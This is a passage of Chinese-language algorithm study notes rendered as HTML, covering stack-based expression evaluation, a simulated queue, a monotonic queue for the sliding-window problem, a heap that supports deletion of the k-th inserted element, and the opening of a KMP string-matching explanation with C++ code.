class="hljs-string">&#x27;+&#x27;</span>) ans=a+b;<br>    <span class="hljs-keyword">if</span>(operation==<span class="hljs-string">&#x27;-&#x27;</span>) ans=a-b;<br>    <span class="hljs-keyword">if</span>(operation==<span class="hljs-string">&#x27;*&#x27;</span>) ans=a*b;<br>    <span class="hljs-keyword">if</span>(operation==<span class="hljs-string">&#x27;/&#x27;</span>) ans=a/b;<br>    num.<span class="hljs-built_in">push</span>(ans);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    unordered_map&lt;<span class="hljs-type">char</span>,<span class="hljs-type">int</span>&gt; h=&#123;&#123;<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-number">1</span>&#125;,&#123;<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-number">1</span>&#125;,&#123;<span class="hljs-string">&#x27;*&#x27;</span>,<span class="hljs-number">2</span>&#125;,&#123;<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-number">2</span>&#125;&#125;;<br>    string s;<br>    cin&gt;&gt;s;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;s.<span class="hljs-built_in">size</span>();i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">isdigit</span>(s[i]))&#123;<br>            <span class="hljs-type">int</span> j=i,a=<span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">while</span>(j&lt;s.<span class="hljs-built_in">size</span>()&amp;&amp;<span class="hljs-built_in">isdigit</span>(s[j]))<br>            &#123;<br>                a=a*<span class="hljs-number">10</span>+s[j]-<span class="hljs-string">&#x27;0&#x27;</span>;<br>                j++;<br>            &#125;<br>            num.<span class="hljs-built_in">push</span>(a);<br>            i=j<span class="hljs-number">-1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(s[i]==<span class="hljs-string">&#x27;(&#x27;</span>) op.<span class="hljs-built_in">push</span>(s[i]);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(s[i]==<span class="hljs-string">&#x27;)&#x27;</span>)<br>        &#123;<br>            <span class="hljs-keyword">while</span>(op.<span class="hljs-built_in">top</span>()!=<span class="hljs-string">&#x27;(&#x27;</span>) <span class="hljs-built_in">eval</span>();<br>            op.<span class="hljs-built_in">pop</span>();<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">while</span>(op.<span class="hljs-built_in">size</span>()&amp;&amp;h[op.<span class="hljs-built_in">top</span>()]&gt;=h[s[i]]) <span class="hljs-built_in">eval</span>();<br>            op.<span class="hljs-built_in">push</span>(s[i]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">while</span>(op.<span class="hljs-built_in">size</span>()) <span class="hljs-built_in">eval</span>();<br>    cout&lt;&lt;num.<span class="hljs-built_in">top</span>()&lt;&lt;endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="模拟队列和单调队列">模拟队列和单调队列</h1><h2 id="模拟队列">模拟队列</h2><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs arcade">实现一个队列，队列初始为空，支持四种操作：<br><br><span class="hljs-built_in">push</span> x – 向队尾插入一个数 x；<br><span class="hljs-built_in">pop</span> – 从队头弹出一个数；<br>empty – 判断队列是否为空；<br>query – 查询队头元素。<br>现在要对队列进行 M 个操作，其中的每个操作 <span class="hljs-number">3</span> 和操作 <span class="hljs-number">4</span> 都要输出相应的结果。<br><br>输入格式<br>第一行包含整数 M，表示操作次数。<br><br>接下来 M 行，每行包含一个操作命令，操作命令为 <span class="hljs-built_in">push</span> x，<span class="hljs-built_in">pop</span>，empty，query 中的一种。<br><br>输出格式<br>对于每个 empty 和 query 操作都要输出一个查询结果，每个结果占一行。<br><br>其中，empty 操作的查询结果为 YES 或 NO，query 操作的查询结果为一个整数，表示队头元素的值。<br><br>数据范围<br><span class="hljs-number">1</span>≤M≤<span class="hljs-number">100000</span>,<br><span class="hljs-number">1</span>≤x≤<span class="hljs-number">109</span>,<br>所有操作保证合法。<br><br>输入样例：<br><span class="hljs-number">10</span><br><span class="hljs-built_in">push</span> <span class="hljs-number">6</span><br>empty<br>query<br><span class="hljs-built_in">pop</span><br>empty<br><span class="hljs-built_in">push</span> <span class="hljs-number">3</span><br><span class="hljs-built_in">push</span> <span class="hljs-number">4</span><br><span class="hljs-built_in">pop</span><br>query<br><span class="hljs-built_in">push</span> <span class="hljs-number">6</span><br>输出样例：<br>NO<br><span class="hljs-number">6</span><br>YES<br><span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> queue[N],head,tt=<span class="hljs-number">-1</span>;<span class="hljs-comment">//初始化队列尾把为-1，这样插入的时候头和尾就会一样了</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">push</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    queue[++tt]=x;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">pop</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    head++;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">empty</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(head&lt;=tt) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">query</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> queue[head];<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string operation;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">while</span>(n--)<br>    &#123;<br>        cin&gt;&gt;operation;<br>        <span class="hljs-keyword">if</span>(operation==<span class="hljs-string">&quot;push&quot;</span>)<br>        &#123;<br>            <span class="hljs-type">int</span> x;<br>            cin&gt;&gt;x;<br>            <span class="hljs-built_in">push</span>(x);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(operation==<span class="hljs-string">&quot;pop&quot;</span>)<br>        &#123;<br>            <span class="hljs-built_in">pop</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span>(operation==<span class="hljs-string">&quot;empty&quot;</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">empty</span>()) cout&lt;&lt;<span class="hljs-string">&quot;NO&quot;</span>&lt;&lt;endl;<br>            <span class="hljs-keyword">else</span> cout&lt;&lt;<span class="hljs-string">&quot;YES&quot;</span>&lt;&lt;endl;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(operation==<span class="hljs-string">&quot;query&quot;</span>)<br>        &#123;<br>            cout&lt;&lt;<span class="hljs-built_in">query</span>()&lt;&lt;endl;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="单调队列">单调队列</h2><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs subunit">154. 滑动窗口<br>   题目<br>   提交记录<br>   讨论<br>   题解<br>   视频讲解<br><br>给定一个大小为 n≤106 的数组。<br><br>有一个大小为 k 的滑动窗口，它从数组的最左边移动到最右边。<br><br>你只能在窗口中看到 k 个数字。<br><br>每次滑动窗口向右移动一个位置。<br><br>以下是一个例子：<br><br>该数组为 [1 3 <span class="hljs-string">-1</span> <span class="hljs-string">-3</span> 5 3 6 7]，k 为 3。<br><br>窗口位置最小值最大值<br>[1 3 <span class="hljs-string">-1</span>] <span class="hljs-string">-3</span> 5 3 6 7<span class="hljs-string">-1</span>3<br>1 [3 <span class="hljs-string">-1</span> <span class="hljs-string">-3</span>] 5 3 6 7<span class="hljs-string">-3</span>3<br>1 3 [<span class="hljs-string">-1</span> <span class="hljs-string">-3</span> 5] 3 6 7<span class="hljs-string">-3</span>5<br>1 3 <span class="hljs-string">-1</span> [<span class="hljs-string">-3</span> 5 3] 6 7<span class="hljs-string">-3</span>5<br>1 3 <span class="hljs-string">-1</span> <span class="hljs-string">-3</span> [5 3 6] 736<br>1 3 <span class="hljs-string">-1</span> <span class="hljs-string">-3</span> 5 [3 6 7]37<br>你的任务是确定滑动窗口位于每个位置时，窗口中的最大值和最小值。<br><br>输入格式<br>输入包含两行。<br><br>第一行包含两个整数 n 和 k，分别代表数组长度和滑动窗口的长度。<br><br>第二行有 n 个整数，代表数组的具体数值。<br><br>同行数据之间用空格隔开。<br><br>输出格式<br>输出包含两个。<br><br>第一行输出，从左至右，每个位置滑动窗口中的最小值。<br><br>第二行输出，从左至右，每个位置滑动窗口中的最大值。<br><br>输入样例：<br>8 3<br>1 3 <span class="hljs-string">-1</span> <span class="hljs-string">-3</span> 5 3 6 7<br>输出样例：<br><span class="hljs-string">-1</span> <span class="hljs-string">-3</span> <span class="hljs-string">-3</span> <span class="hljs-string">-3</span> 3 3<br>3 3 5 5 6 7<br></code></pre></td></tr></table></figure><p>思路：</p><p>最小值和最大值分开来做，两个for循环完全类似，都做以下四步：</p><ol type="1"><li>解决队首已经出窗口的问题;</li><li>解决队尾与当前元素a[i]不满足单调性的问题;</li><li>将当前元素下标加入队尾;</li><li>如果满足条件则输出结果;</li></ol><p>需要注意的细节：</p><ol type="1"><li>上面四个步骤中一定要先3后4，因为有可能输出的正是新加入的那个元素</li><li>队列中存的是原数组的下标，取值时要再套一层，a[q[]];</li><li>算最大值前注意将hh和tt重置;</li><li>此题用cout会超时，只能用printf;</li><li>hh从0开始，数组下标也要从0开始。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e6</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> hh,tt=<span class="hljs-number">-1</span>,a[N],q[N];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,k;<br>    cin&gt;&gt;n&gt;&gt;k;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++) cin&gt;&gt;a[i];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(hh&lt;=tt&amp;&amp;k&lt;i-q[hh]+<span class="hljs-number">1</span>)  hh++;<span class="hljs-comment">//维护窗口长度</span><br>        <span class="hljs-keyword">while</span>(hh&lt;=tt&amp;&amp;a[q[tt]]&gt;=a[i]) tt--; <span class="hljs-comment">//使队列单调</span><br>        q[++tt]=i;<span class="hljs-comment">//传入最后一个满足的值</span><br>        <span class="hljs-keyword">if</span>(i&gt;=k<span class="hljs-number">-1</span>) cout&lt;&lt;a[q[hh]]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    cout&lt;&lt;endl;<br>    hh=<span class="hljs-number">0</span>,tt=<span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)&#123;<br>        <span class="hljs-keyword">if</span>(hh&lt;=tt&amp;&amp;k&lt;i-q[hh]+<span class="hljs-number">1</span>) hh++;<br>        <span class="hljs-keyword">while</span>(hh&lt;=tt&amp;&amp;a[q[tt]]&lt;=a[i]) tt--;<br>        q[++tt]=i;<br>        <span class="hljs-keyword">if</span>(i&gt;=k<span class="hljs-number">-1</span>) cout&lt;&lt;a[q[hh]]&lt;&lt;<span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="堆">堆</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1e5</span>+<span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> h[N],hp[N],ph[N],cur_size,m;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">heap_swap</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">swap</span>(ph[hp[a]],ph[hp[b]]);<br>    <span class="hljs-built_in">swap</span>(hp[a],hp[b]);<br>    <span class="hljs-built_in">swap</span>(h[a],h[b]);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">up</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">while</span>(x/<span class="hljs-number">2</span>&amp;&amp;h[x/<span class="hljs-number">2</span>]&gt;h[x])<br>    &#123;<br>       <span class="hljs-built_in">heap_swap</span>(x,x/<span class="hljs-number">2</span>);<br>        x&gt;&gt;=<span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">down</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> t=x;<br>    <span class="hljs-keyword">if</span>(x*<span class="hljs-number">2</span>&lt;=cur_size&amp;&amp;h[<span class="hljs-number">2</span>*x]&lt;h[t]) t=<span class="hljs-number">2</span>*x;<br>    <span class="hljs-keyword">if</span>(x*<span class="hljs-number">2</span>+<span class="hljs-number">1</span>&lt;=cur_size&amp;&amp;h[<span class="hljs-number">2</span>*x+<span class="hljs-number">1</span>]&lt;h[t]) t=<span class="hljs-number">2</span>*x+<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span>(x!=t)<br>    &#123;<br>        <span class="hljs-built_in">heap_swap</span>(t,x);<br>        <span class="hljs-built_in">down</span>(t);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin&gt;&gt;n;<br>    <span class="hljs-keyword">while</span>(n--)<br>    &#123;<br>        string op;<br>        cin&gt;&gt;op;<br>        <span class="hljs-keyword">if</span>(op==<span class="hljs-string">&quot;I&quot;</span>)<br>        &#123;<br>            <span class="hljs-type">int</span> x;<br>            cin&gt;&gt;x;<br>            cur_size++;<br>            m++;<br>            ph[m]=cur_size,hp[cur_size]=m;<br>            h[cur_size]=x;<br>            <span class="hljs-built_in">up</span>(cur_size);<span class="hljs-comment">//最后插入，需要up</span><br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(op==<span class="hljs-string">&quot;PM&quot;</span>) cout&lt;&lt;h[<span class="hljs-number">1</span>]&lt;&lt;endl;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(op==<span class="hljs-string">&quot;DM&quot;</span>)<br>        &#123;<br>            <span class="hljs-built_in">heap_swap</span>(<span class="hljs-number">1</span>,cur_size);<br>            cur_size--;<br>            <span class="hljs-built_in">down</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(op==<span class="hljs-string">&quot;D&quot;</span>)<br>        &#123;<br>            <span class="hljs-type">int</span> x;<br>            cin&gt;&gt;x;<br>            <span class="hljs-type">int</span> k=ph[x];<span class="hljs-comment">//找到第k个插入的数在堆中的位置，因为删除k后，我们就丢失额了原先第k个数的位置</span><br>            <span class="hljs-built_in">heap_swap</span>(ph[x],cur_size);<br>            cur_size--;<br>            <span class="hljs-built_in">down</span>(k);<br>            <span class="hljs-built_in">up</span>(k);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-type">int</span> k,x;<br>            cin&gt;&gt;k&gt;&gt;x;<br>            h[ph[k]]=x;<br>            <span class="hljs-built_in">down</span>(ph[k]);<br>            <span class="hljs-built_in">up</span>(ph[k]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//注意代码要放在两组三个点之间，才可以正确显示代码高亮哦~</span><br></code></pre></td></tr></table></figure><h1 id="kmp">KMP</h1><p>KMP全称为Knuth MorrisPratt算法，三个单词分别是三个作者的名字。KMP是一种高效的字符串匹配算法，用来在主字符串中查找模式字符串的位置(比如在“hello,world”主串中查找“world”模式串的位置)。</p><h2 id="kmp算法的高效体现在哪">KMP算法的高效体现在哪</h2><p>高效性是通过和其他字符串搜索算法对比得到的，在这里拿BF(BruteForce)算法做一下对比。BF算法是一种最朴素的暴力搜索算法。它的思想是在主串的[0,n-m]区间内依次截取长度为m的子串，看子串是否和模式串一样(n是主串的长度，m是子串的长度)。BF的时间复杂度是O(N*N)，存在很大优化空间。当模式串和主串匹配时，遇到模式串中某个字符不能匹配的情况，对于模式串中已经匹配过的那些字符，如果我们能找到一些规律，将模式串多往后移动几位，而不是像BF算法一样，每次把模式串移动一位，就可以提高算法的效率。比如说在“ababaababacd”中查找“ababac”，可以避免一些字符之间的比较。</p><p>下面通过一个具体的例子来看看可以跳过的情况。比如主模式串是”ababaeaba”,模式串是”ababacd”,在BF算法中，遇到不匹配的情况是这样处理的:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">main:</span>    <span class="hljs-string">&quot;ababaeaba&quot;</span> // 例如这两个串，当<span class="hljs-keyword">sub</span>为<span class="hljs-string">&quot;ababaea&quot;</span>时和<span class="hljs-string">&quot;ababacd&quot;</span>进行对<br><span class="hljs-symbol">pattern:</span> <span class="hljs-string">&quot;ababacd&quot;</span>   // 比，当main[i]为e时，发现和pattern[j]的值e不一致，BF<br>                                         // 的做法是去下一个<span class="hljs-keyword">sub</span>,即用<span class="hljs-string">&quot;babaeab&quot;</span>和pattern进行比较。<br></code></pre></td></tr></table></figure><p>我没希望找到一些规律，遇到两个字符不匹配的情况时，希望可以多跳几个字符，减少比较次数。KMP算法的思想是：在模式串和主串匹配过程中，当遇到不匹配的字符时，对于主串和模式串中已对比过相同的前缀字符串，找到长度最长的相等前缀串，从而将模式串一次性滑动多位，并省略一些比较过程。在上个例子，KMP算法中，是这样处理的：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs awk">main:    <span class="hljs-string">&quot;ababaeaba&quot;</span> <span class="hljs-regexp">//</span> 比如main中的<span class="hljs-string">&quot;ababa&quot;</span>子串，对标为[<span class="hljs-number">2</span>~<span class="hljs-number">4</span>]的<span class="hljs-string">&quot;aba&quot;</span>和pattern中下<br>pattern: <span class="hljs-string">&quot;ababacd&quot;</span>   <span class="hljs-regexp">//</span> 标为[<span class="hljs-number">0</span>~<span class="hljs-number">2</span>]的<span class="hljs-string">&quot;aba&quot;</span>相同,此时可以滑动j-k位,即j=j-k。(其中j是<br>                                         <span class="hljs-regexp">//</span> pattern中<span class="hljs-string">&quot;c&quot;</span>的下标,k是<span class="hljs-string">&quot;abc&quot;</span>的长度)。<br>            <span class="hljs-string">&quot;ababaeaba&quot;</span>      <span class="hljs-regexp">//</span> 比较过程中，main[<span class="hljs-number">5</span>]为<span class="hljs-string">&quot;e&quot;</span>和pattern[<span class="hljs-number">5</span>]为<span class="hljs-string">&quot;c&quot;</span>不匹配，但是两个<br>            <span class="hljs-string">&quot;ababacd&quot;</span>            <span class="hljs-regexp">//</span> 串中都有相同的<span class="hljs-string">&quot;aba&quot;</span>前缀,所以可以滑动j-k位<br>                    |           <br>                    ∨<br>            <span class="hljs-string">&quot;ababaeaba&quot;</span>   <br>                <span class="hljs-string">&quot;ababacd&quot;</span><br>                    |               <span class="hljs-regexp">//</span> 滑动j-k位后发现main[<span class="hljs-number">5</span>]和patterb[<span class="hljs-number">3</span>]不相同，需要再次滑动<br>                    ∨<br>            <span class="hljs-string">&quot;ababaeaba&quot;</span>   <br>                    <span class="hljs-string">&quot;ababacd&quot;</span> <span class="hljs-regexp">//</span> 滑动过程和上次类似。<br></code></pre></td></tr></table></figure><p>通过这个例子可以看出，每次滑动的位数是j-k，滑动位数和主串无关，仅通过模式串就可以求出。在KMP算法中通过next数组来存储当两个字符不相等时模式串应该移动的位数。</p><p>如何KMP算法的next数组 再次明确next数组的含义 :next数组用来存模式串中每个前缀最长的能匹配前缀子串的结尾字符的下标。next[i] = j表示下标以i-j为起点，i为终点的后缀和下标以0为起点，j为终点的前缀相等，且此字符串的长度最长。用符号表示为p[0~j]== p[i-j~i]。下面以”ababacd”模式串为例，给出这个串的next数组。</p><table><thead><tr><th>模式前缀</th><th>前缀结尾下标</th><th>最长能匹配前缀子串结尾字符的下标</th><th>next数组的取值</th><th>匹配情况</th></tr></thead><tbody><tr><td>a</td><td>0</td><td>-1</td><td>next[0] = -1</td><td>无</td></tr><tr><td>ab</td><td>1</td><td>-1</td><td>next[1] = -1</td><td>无</td></tr><tr><td>aba</td><td>2</td><td>0</td><td>next[2]=0</td><td>pattern[2]==pattern[0]</td></tr><tr><td>abab</td><td>3</td><td>1</td><td>next[3]=1</td><td>pattern[2:4]==pattern[0:2]</td></tr><tr><td>ababa</td><td>4</td><td>2</td><td>next[4]=2</td><td>pattern[2:5]==pattern[0:3]</td></tr><tr><td>ababac</td><td>5</td><td>-1</td><td>next[5]=-1</td><td>无</td></tr></tbody></table><p>KMP的代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td 